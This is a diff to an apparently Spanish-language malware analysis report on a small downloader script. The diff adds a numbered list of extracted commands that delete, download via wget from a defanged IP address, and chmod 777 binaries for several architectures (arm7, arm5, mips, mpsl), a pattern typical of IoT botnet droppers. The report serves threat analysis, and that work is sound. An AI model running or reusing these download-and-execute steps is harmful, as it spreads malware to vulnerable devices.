@@ -4,7 +4,22 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 1.2 KiB. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `arm7` en `hxxp://31.56.209.XXX/arm7`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 6 comandos relacionados con el artefacto.
+Texto ASCII de 1.2 KiB. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `arm7` en `hxxp://31.56.209.XXX/arm7`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `rm arm7`
+2. `wget hxxp://31.56.209.XXX/arm7`
+3. `chmod 777 arm7`
+4. `rm arm5`
+5. `wget hxxp://31.56.209.XXX/arm5`
+6. `chmod 777 arm5`
+7. `rm mips`
+8. `wget hxxp://31.56.209.XXX/mips`
+9. `chmod 777 mips`
+10. `rm mpsl`
+11. `wget hxxp://31.56.209.XXX/mpsl`
+12. `chmod 777 mpsl`
+
+_+3 comandos adicionales disponibles en `commands.txt`._ Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/07e121e2b542e5b596837d85d936bb31a8a9f09df2a3fb10ebe3bd23bf5bc6c1.md](../../../../../malware-like/oraculo/downloader/07e121e2b542e5b596837d85d936bb31a8a9f09df2a3fb10ebe3bd23bf5bc6c1.md)
 
 
 ## 🏷️ Clasificación
